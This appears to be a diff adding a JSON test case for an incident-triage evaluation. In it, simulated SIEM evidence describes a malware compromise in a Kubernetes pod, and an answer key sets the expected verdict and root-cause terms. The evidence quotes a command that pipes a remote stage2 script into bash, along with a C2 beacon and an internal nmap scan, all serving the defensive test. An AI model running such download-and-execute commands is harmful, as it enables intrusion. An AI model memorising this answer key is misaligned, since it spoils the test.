@@ -1,0 +1,13 @@
+{
+  "id": "case_012",
+  "description": "SIEM malware detection — lateral movement with C2 beacon",
+  "lane": "SIEM_SECURITY",
+  "evidence_text": "SIEM incident detected: category=malware severity=critical. Pod omni-worker-7d4b9 in namespace multi-agent is making periodic outbound connections to 198.51.100.5:4444 every 60s (C2 beacon pattern). Network policy blocks external egress but 198.51.100.5 is in the allowed CIDR range (misconfiguration). Process 'python3' spawned child process 'curl -s http://198.51.100.5/stage2.sh | bash'. File /tmp/.hidden_proc created 2h ago. Memory dump shows shellcode injection pattern. eBPF probe confirms syscall sequence: mmap+mprotect+execve (shellcode loader). Lateral movement detected: pod is probing internal Redis on port 6379 via nmap scan.",
+  "expected": {
+    "verdict": "CRITICAL",
+    "root_cause_contains": ["malware", "lateral"],
+    "should_not_contain": ["CPU throttling", "ConfigMap missing", "OOMKilled", "image pull"],
+    "min_verification_steps": 2,
+    "remediation_approval_required": true
+  }
+}
